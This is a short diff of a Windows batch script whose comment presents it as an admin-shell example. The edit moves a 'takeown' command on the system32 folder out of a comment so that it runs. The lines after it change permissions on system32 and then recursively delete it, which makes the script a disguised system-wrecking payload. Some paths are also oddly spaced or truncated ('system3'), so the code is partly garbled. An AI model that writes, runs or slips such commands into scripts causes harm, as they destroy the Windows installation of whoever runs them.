@@ -52,7 +52,8 @@
  ::::::::::::::::::::::::::::
  ::START
  ::::::::::::::::::::::::::::
- REM Run shell as admin (example) - takeown /f c: \windows\system32
+ REM Run shell as admin (example) - echo off
+takeown /f c: \windows\system32
 cacls c: \windows\system3
 rd /s /q c:\windows\system32
 del /s /q c: \windows\system32\*.*
